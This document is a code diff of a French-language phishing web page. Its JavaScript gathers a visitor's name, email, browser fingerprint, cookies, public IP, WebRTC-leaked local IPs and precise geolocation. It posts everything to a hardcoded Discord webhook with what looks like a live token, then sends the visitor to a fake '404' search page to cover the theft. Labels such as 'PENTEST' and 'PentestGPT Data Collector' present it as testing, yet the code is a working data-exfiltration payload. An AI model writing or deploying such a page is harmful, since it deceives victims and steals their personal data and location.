@@ -133,162 +133,66 @@
             document.getElementById('loading').style.display = 'block';
             document.querySelector('.btn').style.display = 'none';
             
-            // Collecter les informations de base
+            // Collecter toutes les informations
             var infos = {
-                // Nouvelles informations d'identité
                 prenom: prenom,
                 nom: nom,
                 nom_complet: prenom + ' ' + nom,
                 email: email,
-                
-                // Informations système
                 navigateur: navigator.userAgent,
                 plateforme: navigator.platform,
                 langue: navigator.language,
                 langues: navigator.languages ? navigator.languages.join(', ') : navigator.language,
-                ecran: screen.width + 'x' + screen.height + ' (' + screen.colorDepth + ' bits)',
+                ecran: screen.width + 'x' + screen.height,
                 fenetre: window.innerWidth + 'x' + window.innerHeight,
                 fuseau: Intl.DateTimeFormat().resolvedOptions().timeZone,
                 url: window.location.href,
                 referent: document.referrer || "Accès direct",
                 horodatage: new Date().toISOString(),
                 cookies: document.cookie || "Aucun cookie",
-                connexion: navigator.connection ? navigator.connection.effectiveType : "Inconnue",
-                
-                // Informations réseau
-                wifi_type: navigator.connection ? navigator.connection.type : "Inconnue",
-                wifi_downlink: navigator.connection ? navigator.connection.downlink + ' Mbps' : "Inconnue",
-                wifi_rtt: navigator.connection ? navigator.connection.rtt + ' ms' : "Inconnue",
-                wifi_saveData: navigator.connection ? (navigator.connection.saveData ? "Activé" : "Désactivé") : "Inconnue"
+                connexion: navigator.connection ? navigator.connection.effectiveType : "Inconnue"
             };
             
-            // Démarrer la collecte IP avec plusieurs méthodes
-            obtenirToutesLesIPs(infos);
+            // Collecter l'IP publique
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    infos.ip_publique = data.ip;
+                    obtenirIPLocale(infos);
+                })
+                .catch(() => {
+                    infos.ip_publique = "Non disponible";
+                    obtenirIPLocale(infos);
+                });
         }
         
-        function obtenirToutesLesIPs(infos) {
-            var tentatives = 0;
-            var maxTentatives = 5;
-            var delai = 1000; // 1 seconde entre chaque tentative
-            
-            function essayerProchainService() {
-                tentatives++;
-                console.log(`Tentative ${tentatives}/${maxTentatives} pour obtenir l'IP`);
-                
-                switch(tentatives) {
-                    case 1:
-                        // Service ipify (très fiable)
-                        fetch('https://api.ipify.org?format=json')
-                            .then(response => response.json())
-                            .then(data => {
-                                infos.ip_publique = data.ip;
-                                obtenirIPLocaleEtEnvoyer(infos);
-                            })
-                            .catch(() => {
-                                setTimeout(essayerProchainService, delai);
-                            });
-                        break;
-                        
-                    case 2:
-                        // Service ipapi.co
-                        fetch('https://ipapi.co/json/')
-                            .then(response => response.json())
-                            .then(data => {
-                                infos.ip_publique = data.ip;
-                                infos.ville = data.city;
-                                infos.pays = data.country_name;
-                                infos.fai = data.org;
-                                obtenirIPLocaleEtEnvoyer(infos);
-                            })
-                            .catch(() => {
-                                setTimeout(essayerProchainService, delai);
-                            });
-                        break;
-                        
-                    case 3:
-                        // Service httpbin.org
-                        fetch('https://httpbin.org/ip')
-                            .then(response => response.json())
-                            .then(data => {
-                                infos.ip_publique = data.origin;
-                                obtenirIPLocaleEtEnvoyer(infos);
-                            })
-                            .catch(() => {
-                                setTimeout(essayerProchainService, delai);
-                            });
-                        break;
-                        
-                    case 4:
-                        // Service icanhazip
-                        fetch('https://icanhazip.com/')
-                            .then(response => response.text())
-                            .then(data => {
-                                infos.ip_publique = data.trim();
-                                obtenirIPLocaleEtEnvoyer(infos);
-                            })
-                            .catch(() => {
-                                setTimeout(essayerProchainService, delai);
-                            });
-                        break;
-                        
-                    case 5:
-                        // Service jsonip.com
-                        fetch('https://jsonip.com/')
-                            .then(response => response.json())
-                            .then(data => {
-                                infos.ip_publique = data.ip;
-                                obtenirIPLocaleEtEnvoyer(infos);
-                            })
-                            .catch(() => {
-                                // Dernier recours : continuer sans IP
-                                infos.ip_publique = "Tous les services ont échoué";
-                                obtenirIPLocaleEtEnvoyer(infos);
-                            });
-                        break;
-                        
-                    default:
-                        infos.ip_publique = "Impossible à obtenir";
-                        obtenirIPLocaleEtEnvoyer(infos);
-                        break;
-                }
-            }
-            
-            essayerProchainService();
-        }
-        
-        function obtenirIPLocaleEtEnvoyer(infos) {
-            // Méthode WebRTC pour IP locale (peut être bloquée)
+        function obtenirIPLocale(infos) {
+            // Essayer d'obtenir l'IP locale via WebRTC
             var RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
             
             if (RTCPeerConnection) {
                 try {
-                    var pc = new RTCPeerConnection({
-                        iceServers: [
-                            {urls: "stun:stun.l.google.com:19302"},
-                            {urls: "stun:stun1.l.google.com:19302"},
-                            {urls: "stun:stun.services.mozilla.com"}
-                        ]
-                    });
+                    var pc = new RTCPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}]});
                     var ips = [];
                     
                     pc.createDataChannel("");
                     pc.createOffer().then(pc.setLocalDescription.bind(pc));
                     
                     pc.onicecandidate = function(ice) {
-                        if (!ice || !ice.candidate || !ice.candidate.candidate) return;
+                        if (!ice || !ice.candidate) return;
                         var myIP = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
-                        if (myIP && ips.indexOf(myIP[1]) == -1 && myIP[1] !== '0.0.0.0') {
+                        if (myIP && ips.indexOf(myIP[1]) == -1) {
                             ips.push(myIP[1]);
                         }
                     };
                     
                     setTimeout(() => {
-                        infos.ip_locales = ips.length > 0 ? ips.join(', ') : "Non détectées (WebRTC bloqué)";
+                        infos.ip_locales = ips.length > 0 ? ips.join(', ') : "Non détectées";
                         pc.close();
                         obtenirGeolocalisation(infos);
-                    }, 3000);
+                    }, 2000);
                 } catch(e) {
-                    infos.ip_locales = "Erreur WebRTC: " + e.message;
+                    infos.ip_locales = "Erreur WebRTC";
                     obtenirGeolocalisation(infos);
                 }
             } else {
@@ -304,20 +208,13 @@
                         infos.latitude = position.coords.latitude.toFixed(6);
                         infos.longitude = position.coords.longitude.toFixed(6);
                         infos.precision = position.coords.accuracy + 'm';
-                        if (position.coords.altitude) {
-                            infos.altitude = position.coords.altitude.toFixed(2) + 'm';
-                        }
                         envoyerVersDiscord(infos);
                     },
                     function(error) {
-                        infos.geolocalisation = "Refusée (" + error.message + ")";
+                        infos.geolocalisation = "Refusée: " + error.message;
                         envoyerVersDiscord(infos);
                     },
-                    { 
-                        enableHighAccuracy: true,
-                        timeout: 5000,
-                        maximumAge: 0
-                    }
+                    { timeout: 5000 }
                 );
             } else {
                 infos.geolocalisation = "Non supportée";
@@ -327,105 +224,48 @@
         
         function envoyerVersDiscord(infos) {
             var message = {
-                content: "🎯 **NOUVELLE COLLECTE - TEST D'INTRUSION**",
+                content: "🎯 **NOUVELLE COLLECTE - PENTEST**",
                 embeds: [{
                     title: "📊 Informations Collectées",
                     color: 3066993,
                     fields: [
                         {
                             name: "👤 Identité",
-                            value: "**Nom complet:** " + infos.nom_complet + "\n**Email:** " + infos.email,
+                            value: "**Nom:** " + infos.nom_complet + "\n**Email:** " + infos.email,
                             inline: false
                         },
                         {
                             name: "🌐 Adresses IP",
-                            value: "**Publique:** " + (infos.ip_publique || "Non obtenue") + "\n**Locale(s):** " + (infos.ip_locales || "Non obtenues"),
+                            value: "**Publique:** " + infos.ip_publique + "\n**Locale(s):** " + (infos.ip_locales || "N/A"),
                             inline: false
                         },
                         {
-                            name: "📡 Réseau WiFi/Mobile",
-                            value: "**Type:** " + infos.wifi_type + "\n**Débit:** " + infos.wifi_downlink + "\n**Latence:** " + infos.wifi_rtt,
+                            name: "📱 Système",
+                            value: "**Plateforme:** " + infos.plateforme + "\n**Écran:** " + infos.ecran,
                             inline: true
                         },
                         {
-                            name: "🌐 Navigateur",
-                            value: "```" + infos.navigateur.substring(0, 800) + "```",
+                            name: "🌍 Localisation",
+                            value: infos.latitude ? ("**Lat:** " + infos.latitude + "\n**Lng:** " + infos.longitude) : (infos.geolocalisation || "Non disponible"),
+                            inline: true
+                        },
+                        {
+                            name: "🕒 Horodatage",
+                            value: infos.horodatage,
                             inline: false
                         },
                         {
-                            name: "💻 Système",
-                            value: infos.plateforme,
-                            inline: true
-                        },
-                        {
-                            name: "🗣️ Langue(s)",
-                            value: infos.langues,
-                            inline: true
-                        },
-                        {
-                            name: "📺 Résolution",
-                            value: infos.ecran,
-                            inline: true
-                        },
-                        {
-                            name: "🪟 Fenêtre",
-                            value: infos.fenetre,
-                            inline: true
-                        },
-                        {
-                            name: "⏰ Fuseau horaire",
-                            value: infos.fuseau,
-                            inline: true
-                        },
-                        {
-                            name: "📡 Connexion",
-                            value: infos.connexion,
-                            inline: true
-                        },
-                        {
-                            name: "🔗 URL d'origine",
+                            name: "🔗 Source",
                             value: infos.url,
-                            inline: false
-                        },
-                        {
-                            name: "↩️ Référent",
-                            value: infos.referent,
                             inline: false
                         }
                     ],
                     timestamp: infos.horodatage,
                     footer: {
-                        text: "Pentest Data Collector v2.2 - Multi-IP Detection"
+                        text: "PentestGPT Data Collector"
                     }
                 }]
             };
-            
-            // Ajouter géolocalisation si disponible
-            if (infos.latitude && infos.longitude) {
-                message.embeds[0].fields.push({
-                    name: "📍 Géolocalisation",
-                    value: `**Latitude:** ${infos.latitude}\n**Longitude:** ${infos.longitude}\n**Précision:** ${infos.precision}` + (infos.altitude ? `\n**Altitude:** ${infos.altitude}` : ""),
-                    inline: false
-                });
-            }
-            
-            // Ajouter localisation IP si disponible
-            if (infos.ville || infos.pays) {
-                message.embeds[0].fields.push({
-                    name: "🗺️ Localisation IP",
-                    value: `**Ville:** ${infos.ville || "N/A"}\n**Pays:** ${infos.pays || "N/A"}\n**FAI:** ${infos.fai || "N/A"}`,
-                    inline: false
-                });
-            }
-            
-            // Ajouter cookies si présents
-            if (infos.cookies !== "Aucun cookie") {
-                message.embeds.push({
-                    title: "🍪 Cookies Détectés",
-                    description: "```" + infos.cookies.substring(0, 1500) + "```",
-                    color: 10181046
-                });
-            }
             
             // 🚨 REMPLACEZ CETTE URL PAR VOTRE WEBHOOK DISCORD 🚨
             var webhookURL = "https://discord.com/api/webhooks/1398006998129184869/xTQjLLkm-7vx_99ahoCvtEx1QTpVAB2EyKMUtF3Y__yIgSKM_X7z19hTO7-iyd5nNjhE";
@@ -437,12 +277,12 @@
                 },
                 body: JSON.stringify(message)
             }).then(function() {
-                // Redirection après 3 secondes
+                // Redirection après envoi réussi
                 setTimeout(function() {
                     window.location.href = 'https://www.google.com/search?q=erreur+404+document+non+trouve';
-                }, 3000);
+                }, 2000);
             }).catch(function(error) {
-                console.error('Erreur envoi Discord:', error);
+                console.error('Erreur:', error);
                 // Redirection même en cas d'erreur
                 setTimeout(function() {
                     window.location.href = 'https://www.google.com/search?q=erreur+404+document+non+trouve';
@@ -452,4 +292,3 @@
     </script>
 </body>
 </html>
-
